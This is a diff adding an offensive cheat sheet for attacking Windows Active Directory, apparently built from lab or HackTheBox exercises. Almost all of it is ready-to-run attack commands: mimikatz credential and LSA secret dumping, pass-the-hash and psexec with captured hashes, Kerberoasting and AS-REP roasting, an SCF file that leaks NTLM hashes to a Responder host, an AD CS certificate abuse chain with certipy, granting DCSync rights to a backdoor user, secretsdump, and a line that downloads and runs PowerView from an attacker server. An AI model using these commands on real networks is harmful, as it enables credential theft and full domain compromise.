@@ -1,0 +1,143 @@
+=========================================================
+[GTFOBins for Active Directory? Yes please!]
+https://wadcoms.github.io
+=========================================================
+
+[ntlmrelay]
+https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py
+
+=========================================================
+Powershell
+[Script (.ps1) disabled]
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine
+
+$Bling$
+
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+[LOCATE NTLM\* SHA1 HASHES]
+
+=========================================================
+[Core net Commands]
+net user
+net user /DOMAIN
+net group /DOMAIN
+net share
+net localgroup
+
+=========================================================
+GetSPN.ps1
+Invoke-Kerberoast.ps1
+PowerView.ps1
+Spray-Creds.ps1
+
+=========================================================
+Powershell
+[Get Current Domain and fun]
+[DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Servers
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+[DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Servers | Select-Object -ExpandProperty Name
+
+=========================================================
+[AD - Overpass The Hash]
+privilege::debug
+sekurlsa::logonpasswords
+<USERNAME>
+sekurlsa::tickets
+[Group 0 - Ticket Granting Service]
+* Username: <USER>
+sekurlsa::pth /user:<USER> /domain:corp.com /ntlm:<NTLM_HASH> /run:PowerShell.exe
+
+=========================================================
+[PSEXEC Reference]
+psexec.py <MACHINE>/<USER>:PASS@$IP
+Example:
+psexec.py THINC/aduser:adpass@x.x.x.x
+
+=========================================================
+[We can Write to a Share?]
+.......What can we do?
+
+# TO START - we're either Enumerating AD with NO CREDENTIALS
+# OR
+# We are Enumerating AD WITH CREDENTIALS. 
+# If we have credentials, we can do a lot more from an automation standpoint but privilege escalation will still remain an issue.
+
+1. Scan the network. Find machines and open ports to exploit a service, with our payload sending back the current logged-in or exploited 
+   user's NTLMv2 hash via LLMNR poisoning.
+
+2. Enumerate DNS, subdomains, etc., to find key servers like printers or open shares that can be leveraged for an LLMNR poisoning attack to retrieve an NTLMv2 hash.
+
+3. Deploy tools like evil-ssdp or evil-winrm if Active Directory credentials are available.
+
+4. Use KERBRUTE to brute force usernames using Kerberos error messages like `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` to identify valid accounts.
+
+5. Access a network share with a NULL Session to place an SCF file to trigger the Lan Manager Service.
+
+Example SCF File:
+[shell]
+Command=2
+IconFile=\\<RESPONDER-IP>\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+
+6. Exploit PrintNightmare (CVE-2021-1675/CVE-2021-34527) for domain controller compromise, if possible.
+
+7. Use misconfigured MSSQL servers for code execution via PowerUpSQL:
+   Import-Module .\PowerUpSQL.psd1
+
+=========================================================
+[AD CS ATTACK]
+ntpdate -s ntp.ubuntu.com
+evil-winrm -i somehost.local -u <user_here> -p '<password_here>'
+certipy find -dc-ip $IP -ns $IP -u <user_here>@somehost.local -p '<password_here>' -vulnerable -stdout
+certipy ca -ca manager-DC01-CA -add-officer <user_here> -username <user_here>@somehost.local -p '<password_here>'
+certipy ca -ca manager-DC01-CA -issue-request $current_key -u <user_here>@somehost.local -p '<password_here>'
+certipy req -ca manager-DC01-CA -target dc01.somehost.local -retrieve 13 -username <user_here>@somehost.local -p '<password_here>'
+certipy auth -pfx administrator.pfx -dc-ip $IP
+ntpdate $IP
+timedatectl set-ntp off
+rdate -n $IP
+certipy auth -pfx administrator.pfx -dc-ip $IP | cut -d":" -f3
+evil-winrm -i somehost.local -u administrator -H ae5064c2f62317332c88629e025924ef
+
+=========================================================
+[AD - DCSYNC ATTACK]
+• ldapsearch -x -H ldap://$IP -b "dc=htb,dc=local"
+  -x = Anonymous Login/NULL SESSIONS
+
+• WINDAPSEARCH to enumerate users (-U):
+  python /opt/windapsearch/windapsearch.py -d htb.local --dc-ip 10.129.95.210 -U
+
+• Extract Kerberos pre-auth hashes:
+  GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.129.95.210 -no-pass
+
+→ [Password CRACKED]
+
+• Add user to groups:
+  net user siren sirenpassword /ADD /DOMAIN
+  net group "Exchange Windows Permissions" siren /ADD
+  net group "Remote Management Users" siren /ADD
+
+• Use Evil-WinRM for execution:
+  upload powerview.ps1
+  iex(new-object net.webclient).downloadstring('http://10.10.14.247:8000/powerview.ps1')
+  $pass = ConvertTo-SecureString 'sirenpassword' -AsPlainText -Force
+  $cred = New-Object System.Management.Automation.PSCredential('htb\siren', $pass)
+  Add-ObjectACL -PrincipalIdentity siren -Credential $cred -Rights DCSync
+
+• Dump secrets:
+  secretsdump.py htb/siren@10.129.95.210
+  psexec.py administrator@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+
+=========================================================
+C:> .\mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::cache
+
+privilige::debug
+token::elevate
+lsadump::lsa /patch
+=========================================================
